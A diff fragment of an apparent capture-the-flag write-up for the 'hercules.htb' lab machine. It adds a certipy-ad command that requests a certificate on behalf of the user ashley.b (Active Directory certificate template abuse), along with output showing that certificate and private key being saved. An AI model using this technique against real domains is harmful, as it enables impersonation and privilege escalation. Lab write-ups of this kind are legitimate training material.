@@ -1374,7 +1374,20 @@ So ill do some enumeration on some of the users that have interesting permission
 
 Ill choose to target the `ashley.b` user to start since she likely has some interesting permissions as discovered earlier from the email and the .lnk file
 
+```python
+certipy-ad req -u "fernando.r@hercules.htb" -k -no-pass -dc-ip 10.129.58.200 -dc-host dc.hercules.htb -target "dc.hercules.htb" -ca 'CA-HERCULES' -template "User" -pfx fernando.r.pfx -on-behalf-of 'HERCULES\ashley.b' -dcom      
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
 
+[*] Requesting certificate via DCOM
+[*] Request ID is 39
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'ashley.b@hercules.htb'
+[*] Certificate object SID is 'S-1-5-21-1889966460-2597381952-958560702-1135'
+[*] Saving certificate and private key to 'ashley.b.pfx'
+[*] Wrote certificate and private key to 'ashley.b.pfx'
+```
+
+Then ill
 
 
 
